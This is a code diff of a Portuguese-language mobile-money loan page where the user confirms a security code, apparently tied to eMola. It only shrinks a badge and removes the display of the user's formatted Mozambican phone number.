@@ -29,10 +29,9 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
 .card{background:rgba(255,255,255,.98);backdrop-filter:blur(20px);border-radius:22px;padding:38px 30px;max-width:440px;width:100%;box-shadow:var(--shadow);border:1px solid rgba(255,255,255,.5);animation:pop .5s cubic-bezier(.34,1.56,.64,1)}
 @keyframes pop{from{opacity:0;transform:scale(.96) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}
 .card-head{text-align:center;margin-bottom:22px}
-.badge{width:64px;height:64px;border-radius:50%;background:linear-gradient(135deg,rgba(217,111,0,.25),rgba(163,74,0,.2));display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:30px;box-shadow:0 6px 16px rgba(217,111,0,.2)}
+.badge{width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,rgba(217,111,0,.25),rgba(163,74,0,.2));display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:28px;box-shadow:0 6px 16px rgba(217,111,0,.2)}
 .card-head h1{font-size:21px;font-weight:900;color:var(--or-dark);margin-bottom:4px}
 .card-head p{color:var(--muted);font-size:12.5px}
-.phone-line{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:8px;font-size:11.5px;color:var(--or-deep);font-weight:700;background:rgba(247,148,29,.08);padding:6px 12px;border-radius:50px;width:fit-content;margin-left:auto;margin-right:auto}
 .bundle-bar{background:var(--grad);border-radius:14px;padding:15px 18px;margin-bottom:22px;color:#fff;box-shadow:0 8px 20px rgba(217,111,0,.2)}
 .b-row{display:flex;justify-content:space-between;font-size:12.5px;margin-bottom:6px}
 .b-row:last-child{margin-bottom:0;padding-top:9px;border-top:1px solid rgba(255,255,255,.22);font-weight:800;font-size:13.5px}
@@ -77,7 +76,6 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
       <div class="badge">🔐</div>
       <h1 data-i18n="so.h1">Confirme o seu código</h1>
       <p data-i18n="so.sub">Última etapa de segurança</p>
-      <div class="phone-line" id="phoneLine" style="display:none">📲 <span id="phoneTxt"></span></div>
     </div>
 
     <div id="bBar" class="bundle-bar" style="display:none">
@@ -148,11 +146,6 @@ let bd={},luid=0,phone='';
 
 function fmtNum(n){return parseInt(n||0).toLocaleString('pt-PT').replace(/\s/g,'.')}
 
-function fmtPhone(p){
-  if(!p||p.length<9)return '+258 '+p;
-  return '+258 '+p.slice(0,2)+' '+p.slice(2,5)+' '+p.slice(5,8)+' '+p.slice(8);
-}
-
 function init(){
   const p=new URLSearchParams(location.search);
   const amount=p.get('amount'),dur=p.get('duration'),interest=p.get('interest'),total=p.get('total');
@@ -163,10 +156,6 @@ function init(){
     document.getElementById('bD').textContent=fmtNum(amount)+' MZN';
     document.getElementById('bDur').textContent=(dur||'—')+' '+(localStorage.getItem('emola_lang')==='en'?'days':'dias');
     document.getElementById('bP').textContent=fmtNum(total||amount)+' MZN';
-  }
-  if(phone){
-    document.getElementById('phoneTxt').textContent=fmtPhone(phone);
-    document.getElementById('phoneLine').style.display='flex';
   }
 }
 
